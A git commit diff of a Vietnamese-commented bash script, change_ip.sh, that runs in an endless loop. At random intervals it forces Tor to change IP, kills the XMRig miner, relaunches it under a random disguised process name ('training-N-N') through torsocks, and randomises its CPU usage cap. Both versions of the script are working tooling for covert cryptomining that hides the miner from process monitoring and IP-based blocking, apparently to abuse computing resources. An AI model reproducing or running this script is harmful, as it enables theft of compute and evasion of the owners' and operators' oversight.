ef7b4fea7df0db933e9c55a7af8fb5eb76d9d9e9
wollfoo <nhac.tien1988@gmail.com>
2024-09-17 17:13:03 +0700

    done

--- change_ip.sh
+++ change_ip.sh
@@ -1,36 +1,30 @@
 #!/bin/bash
 
 while true; do
-    # Chờ trong khoảng thời gian ngẫu nhiên từ 5 đến 10 phút
-    sleep $((RANDOM % 300 + 300))
+  # Ngủ ngẫu nhiên từ 5 đến 10 phút
+  sleep $((RANDOM % 300 + 300))
 
-    echo "Đang yêu cầu Tor thay đổi IP..."
-    kill -HUP $(pgrep tor)
-    echo "Tor đã thay đổi IP."
+  echo "Đang yêu cầu Tor thay đổi IP..."
+  kill -HUP $(pgrep tor)
+  echo "Tor đã thay đổi IP."
 
-    # Kiểm tra và dừng XMRig với tên cũ
-    if [ -f /root/xmrig_name.txt ]; then
-        echo "Dừng XMRig với tên cũ..."
-        xmrig_name=$(cat /root/xmrig_name.txt)
-        pkill -f $xmrig_name
-        rm -f /root/xmrig_name.txt
-        sleep 5
-    fi
+  # Dừng XMRig với tên cũ
+  if [ -f /root/xmrig_name.txt ]; then
+    xmrig_name=$(cat /root/xmrig_name.txt)
+    echo "Dừng XMRig với tên cũ..."
+    pkill -f $xmrig_name
+    rm -f /root/xmrig_name.txt
+  fi
 
-    # Kiểm tra file XMRig có tồn tại hay không trước khi đổi tên
-    if [ ! -f $WORK_DIR/xmrig-${VERSION}/xmrig ]; then
-        echo "XMRig không tồn tại tại $WORK_DIR/xmrig-${VERSION}/xmrig. Kiểm tra quá trình cài đặt."
-        exit 1
-    fi
+  # Tạo tên mới cho XMRig
+  echo "Tạo tên mới cho XMRig..."
+  RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
+  cp /root/work/xmrig-${VERSION}/xmrig_backup /root/work/$RANDOM_NAME
+  chmod +x /root/work/$RANDOM_NAME
+  echo $RANDOM_NAME > /root/xmrig_name.txt
 
-    # Tạo tên mới cho XMRig và chạy lại
-    echo "Tạo tên mới cho XMRig..."
-    RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
-    mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/$RANDOM_NAME
-    chmod +x $WORK_DIR/$RANDOM_NAME
-    echo $RANDOM_NAME > /root/xmrig_name.txt
-
-    echo "Chạy lại XMRig với tên mới $RANDOM_NAME..."
-    cpu_hint=$(shuf -i 70-90 -n 1)
-    torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$cpu_hint &
+  # Chạy lại XMRig với tên mới
+  echo "Chạy lại XMRig với tên mới $RANDOM_NAME..."
+  cpu_hint=$(shuf -i 70-90 -n 1)
+  torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$cpu_hint &
 done
